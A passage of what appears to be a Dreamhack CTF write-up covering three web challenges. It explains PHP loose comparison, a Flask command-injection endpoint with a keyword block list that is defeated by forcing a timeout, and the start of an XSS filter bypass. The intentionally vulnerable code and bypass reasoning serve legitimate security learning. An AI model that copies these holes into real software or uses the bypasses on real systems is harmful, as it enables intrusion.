class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">require_once</span>(&#x27;<span class="title">flag</span>.<span class="title">php</span>&#x27;);</span></span><br><span class="line"><span class="class">    <span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">    // <span class="title">POST</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">_SERVER</span>[&quot;<span class="title">REQUEST_METHOD</span>&quot;] == &quot;<span class="title">POST</span>&quot;) </span>&#123;</span><br><span class="line">      <span class="variable">$input_1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;input1&quot;</span>] ? <span class="variable">$_POST</span>[<span class="string">&quot;input1&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="variable">$input_2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;input2&quot;</span>] ? <span class="variable">$_POST</span>[<span class="string">&quot;input2&quot;</span>] : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$input_1</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$input_2</span> != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_1</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$input_1</span> &lt; <span class="string">&quot;8&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &lt; <span class="string">&quot;7.A&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &gt; <span class="string">&quot;7.9&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &lt; <span class="number">3</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">              <span class="keyword">if</span>(<span class="variable">$input_2</span> &lt; <span class="number">74</span> &amp;&amp; <span class="variable">$input_2</span> &gt; <span class="string">&quot;74&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;pre&gt;FLAG\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Fill the input box.&lt;/h4&gt;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h3&gt;WHat??!&lt;/h3&gt;&quot;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span> </span><br><span class="line">    &lt;/div&gt; </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;php7cmp4re&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- Fixed navbar --&gt;</span><br><span class="line">    &lt;nav <span class="class"><span class="keyword">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">default</span> <span class="title">navbar</span>-<span class="title">fixed</span>-<span class="title">stop</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">header</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">navbar</span>-<span class="title">brand</span>&quot; <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">php7cmp4re</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">navbar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">nav</span> <span class="title">navbar</span>-<span class="title">nav</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">li</span>&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;/&quot;&gt;<span class="title">index</span> <span class="title">page</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;&lt;!--/.<span class="title">nav</span>-<span class="title">collapse</span> --&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">box</span>&quot;&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">h4</span>&gt;<span class="title">Enter</span> <span class="title">the</span> <span class="title">correct</span> <span class="title">Input</span>.&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">          &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;/<span class="title">check</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">input1</span>&quot; <span class="title">name</span>=&quot;<span class="title">input1</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">input2</span>&quot; <span class="title">name</span>=&quot;<span class="title">input2</span>&quot;&gt;</span></span><br><span class="line"><span class="class">              &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;제출&quot;&gt;</span></span><br><span class="line"><span class="class">          &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        <span class="title">require_once</span>(&#x27;<span class="title">flag</span>.<span class="title">php</span>&#x27;);</span></span><br><span class="line"><span class="class">        <span class="title">error_reporting</span>(0);</span></span><br><span class="line"><span class="class">    ?&gt; </span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt; </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;**Sample**&#125;&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>If u notice the check.php, a check role is about</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$input_1</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$input_2</span> != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_1</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$input_1</span> &lt; <span class="string">&quot;8&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &lt; <span class="string">&quot;7.A&quot;</span> &amp;&amp; <span class="variable">$input_1</span> &gt; <span class="string">&quot;7.9&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &lt; <span class="number">3</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$input_2</span>) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">              <span class="keyword">if</span>(<span class="variable">$input_2</span> &lt; <span class="number">74</span> &amp;&amp; <span class="variable">$input_2</span> &gt; <span class="string">&quot;74&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;pre&gt;FLAG\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Good try.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Try again.&lt;/h4&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h4&gt;Fill the input box.&lt;/h4&gt;&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;h3&gt;WHat??!&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_8.png" alt="Untitled"></p>
<ul>
<li><strong>strlen</strong></li>
</ul>
<p>(PHP 4, PHP 5, PHP 7)</p>
<p>The <code>strlen()</code> function is used to measure the length of a string.</p>
<p>**Note:**The function returns the number of bytes instead of the number of characters. (For pure ASCII texts without accept characters are the values the same).</p>
<p>let’s sort it out about this role!</p>
<ul>
<li><p>strlen input_1&lt; 4 ⇒ <strong>input_1 string length cannot exceed 4</strong></p>
<ul>
<li><strong>input_1 &lt; “7.A” &amp;&amp; input_1 &gt; “7.9”</strong> &amp;&amp; input_1 &lt; “8”</li>
<li>The character after 7 is greater than 9(dec 57) and less than A(dec 65)<ul>
<li><code>:</code> ~ <code>@</code></li>
</ul>
</li>
</ul>
</li>
<li><p>strlen($input_2) &lt; 3 &amp;&amp; strlen($input_2) &gt; 1 ⇒  <strong>input_2 string length must greater than 1 and less than 3</strong></p>
<ul>
<li>input_2 &lt; 74 &amp;&amp; input_2 &gt; “74”</li>
</ul>
<p>  In PHP, when converting a string to a number, it tries to convert the numeric part at the beginning of the string to a number until it encounters a non-numeric character. This means that if the string starts with a number, PHP will try to parse that number part into a number, ignoring subsequent characters.</p>
<p>  For example, if you have the string “7a”, PHP will try to parse “7” as a number and ignore “a”. Therefore, “7a” would be interpreted as the number 7 in this case.</p>
<p>  Similarly, for the string “7#”, PHP will also try to parse “7” as a number and ignore the “#”. Therefore, “7#” would also be interpreted as the number 7 in this case.</p>
<ul>
<li>So u just type 7 with any non-numeric character</li>
<li>But remember, the characters entered must be greater than chr 7, that is, non-numeric characters from <code>:</code> ~ <code>~</code> are allowed</li>
</ul>
</li>
</ul>
<p><img src="/img/Dreamhack1_9.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_10.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_11.png" alt="Untitled"></p>
<hr>
<h3 id="BypassIF"><a href="#BypassIF" class="headerlink" title="BypassIF"></a><strong>BypassIF</strong></h3><ul>
<li><strong>Description<br>Admin의 <code>KEY</code>가 필요합니다! 알맞은 <code>KEY</code>값을 입력하여 플래그를 획득하세요.<br>플래그 형식은 DH{…} 입니다.</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line">KEY = hashlib.md5(FLAG.encode()).hexdigest()</span><br><span class="line">guest_key = hashlib.md5(<span class="string">b&quot;guest&quot;</span>).hexdigest()<span class="comment">#084e0343a0486ff05530df6c705c8bb4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># filtering</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    alphabet = <span class="built_in">list</span>(string.ascii_lowercase)</span><br><span class="line">    alphabet.extend([<span class="string">&#x27; &#x27;</span>])</span><br><span class="line">    num = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">    alphabet.extend(num)</span><br><span class="line">    command_list = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> command_list:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># GET request</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">     <span class="comment"># POST request</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        key = request.form.get(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        cmd = request.form.get(<span class="string">&#x27;cmd_input&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> key == KEY:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=FLAG)</span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> key == guest_key:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;guest.html&#x27;</span>, txt=<span class="string">f&quot;guest key: <span class="subst">&#123;guest_key&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd != <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> key == KEY:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filter_cmd(cmd):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    output = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd], timeout=<span class="number">5</span>)</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=output.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">f&#x27;Timeout! Your key: <span class="subst">&#123;KEY&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>notice here</p>
<p>if input guest</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(<span class="string">b&quot;guest&quot;</span>).hexdigest()</span><br><span class="line"><span class="string">&#x27;084e0343a0486ff05530df6c705c8bb4&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_12.png" alt="Untitled"></p>
<p>if input admin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.md5(<span class="string">b&quot;admin&quot;</span>).hexdigest() </span><br><span class="line"><span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_13.png" alt="Untitled"></p>
<p>and notic here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">command_list = [<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;chmod&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;less&#x27;</span>,<span class="string">&#x27;awk&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>if input string not in cmd_list → Error</p>
<p><img src="/img/Dreamhack1_14.png" alt="Untitled"></p>
<p>if input string in cmd_list</p>
<p><img src="/img/Dreamhack1_15.png" alt="Untitled"></p>
<p>here can see the flag.txt</p>
<p>but how to read that file?</p>
<p>we cannot do this </p>
<p><img src="/img/Dreamhack1_16.png" alt="Untitled"></p>
<p>so let’s see the code again</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> cmd != <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> key == KEY:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filter_cmd(cmd):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    output = subprocess.check_output([<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd], timeout=<span class="number">5</span>)</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=output.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">f&#x27;Timeout! Your key: <span class="subst">&#123;KEY&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>if first to success execute command it will timeout&#x3D;5, command exec time limit 5 min</p>
<p>if exceed 5 min it will timeout</p>
<p>notice here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">       <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, txt=<span class="string">f&#x27;Timeout! Your key: <span class="subst">&#123;KEY&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>if timeout it will output flag</p>
<p><img src="/img/Dreamhack1_17.png" alt="Untitled"></p>
<p>ok, I got the admin key, then throw the key back into the input box</p>
<p><img src="/img/Dreamhack1_18.png" alt="Untitled"></p>
<hr>
<h3 id="XSS-Filtering-Bypass-Advanced"><a href="#XSS-Filtering-Bypass-Advanced" class="headerlink" title="XSS Filtering Bypass Advanced"></a><strong>XSS Filtering Bypass Advanced</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Exercise: XSS Filtering Bypass의 패치된 문제입니다.</strong></p>
<ul>
<li><strong>문제 수정 내역</strong></li>
</ul>
<p><strong>2023.08.04 Dockerfile 제공</strong></p>
<p>this question give some file</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    FLAG = <span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    FLAG = <span class="string">&quot;[**FLAG**]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_url</span>(<span class="params">url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    cookie.update(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        service = Service(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.add_argument(_)</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.set_page_load_timeout(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        driver.add_cookie(cookie)</span><br><span class="line">        driver.get(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># return str(e)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_xss</span>(<span class="params">param, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    url = <span class="string">f&quot;http://127.0.0.1:8000/vuln?param=<span class="subst">&#123;urllib.parse.quote(param)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> read_url(url, cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xss_filter</span>(<span class="params">text</span>):</span><br><span class="line">    _<span class="built_in">filter</span> = [<span class="string">&quot;script&quot;</span>, <span class="string">&quot;on&quot;</span>, <span class="string">&quot;javascript&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> _<span class="built_in">filter</span>:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> **text.lower():<span class="comment">#ALL word will be converted to lowercase**</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    advanced_filter = [<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> advanced_filter:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> text.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span 